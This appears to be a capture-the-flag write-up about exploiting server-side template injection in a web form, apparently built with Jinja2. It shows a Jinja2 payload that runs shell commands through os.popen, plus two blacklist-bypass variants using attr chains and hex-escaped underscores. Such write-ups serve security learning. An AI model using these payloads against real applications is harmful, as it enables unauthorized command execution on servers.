# 1. Analysis
There is input form
![](Pasted%20image%2020250507144157.png)

Input normal SSTI payload -> its vulnerable
![](Pasted%20image%2020250507145151.png)

i think it used jinja2 or Twig
![](Pasted%20image%2020250507150030.png)

When i try to inject SSTI payload for running shell command there is a input validation, i think web server blacklisted some character
```
{{cycler.__init__.__globals__.os.popen('ls').read()}}
```
![](Pasted%20image%2020250508103418.png)

# 2. Exploitation
When i browsing on internet i found bypass the SSTI filter
![](Pasted%20image%2020250509094203.png)

then i convert my previous payload into this bypassed payload base on those rules.
```
{{ cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('ls')|attr('read')() }}

{{ cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('ls')|attr('read')() }}
```
![](Pasted%20image%2020250509094943.png)
got the flag
![](Pasted%20image%2020250509095210.png)
# 3. Conclussion
Knowledge need to know:
- SSTI
- Bypassed technique

Hurray! You solved this challenge.